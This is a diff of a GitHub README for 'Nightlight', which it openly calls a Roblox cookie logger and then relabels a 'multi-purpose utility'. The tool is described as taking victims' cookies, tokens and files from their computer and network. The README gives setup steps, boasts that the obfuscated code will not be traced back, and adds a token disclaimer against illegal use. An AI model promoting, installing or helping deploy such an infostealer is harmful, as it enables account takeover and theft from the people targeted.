@@ -1,11 +1,11 @@
 # Nightlight
-# READ instructions(READ).txt
+# Head to Getting Started
 
 ![image-removebg-preview (1)](https://github.com/Vaquent2/Nightlight/blob/main/decoration/textwall.png)
 
-## MESSAGE ME ON DISCORD OR SEND AN ISSUE; vaquent (all lowercase)
+## CREATE AN ISSUE FORM IF SOMETHING IS WRONG
 
-An intuitive roblox cookie logger that can be used to get the victims cookies, tokens, and many other misc files on the users computer and network.
+An intuitive multi-purpose utility that can be used to get the victims cookies, tokens, and many other misc files on the users computer and network.
 
 
 ## FEATURES 
@@ -31,9 +31,9 @@ auto trade limiteds
 ## Getting Started
   Download the files from github
   Have Python 3.11+ and .NET framework x64
-  Run setup.bat
+  Open cmd in the folder and type pip install -r requirements.txt or Run setup.bat
   Run the Nightlight.exe file and let it create all necessary folders and directories be created
-  Run modulefix.bat if anything fails
+  Run modulefix.bat if you get the modules error
   Code is obfuscated so don't worry about it getting traced back
   WE DO NOT ENCOURAGE ANY ILLEGAL USE! 
   
@@ -43,7 +43,7 @@ auto trade limiteds
 ### Dependencies
 
 * .NET framework x64
-* Python 3.11+
+* Python 3.8-3.11 (3.11+ makes some of the stuff stop working)
 
 
 
